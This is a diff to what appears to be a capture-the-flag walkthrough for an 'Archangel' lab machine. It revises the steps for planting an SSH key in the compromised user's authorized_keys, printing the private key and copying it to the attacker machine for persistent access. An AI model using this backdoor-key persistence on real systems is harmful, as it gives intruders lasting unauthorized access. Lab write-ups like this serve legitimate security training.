@@ -276,7 +276,9 @@ cat /home/archangel/secret/user2.txt
 
 ### Stable Shell via SSH
 
-Generate a key pair and place the public key in `archangel`'s `authorized_keys`.
+The key pair is generated on the victim machine. The private key must be copied to the attacker machine before you can SSH in — it never leaves the victim on its own.
+
+Generate the key pair on the victim and authorise it.
 
 ```bash
 ssh-keygen -t ed25519 -f ./private.key
@@ -284,7 +286,13 @@ mkdir -p /home/archangel/.ssh
 cat ./private.key.pub >> /home/archangel/.ssh/authorized_keys
 ```
 
-SSH in for a proper TTY.
+Print the private key and copy the output to a file on the attacker machine.
+
+```bash
+cat ./private.key
+```
+
+On the attacker machine, paste the key into a file and lock down the permissions.
 
 ```bash
 chmod 600 private.key
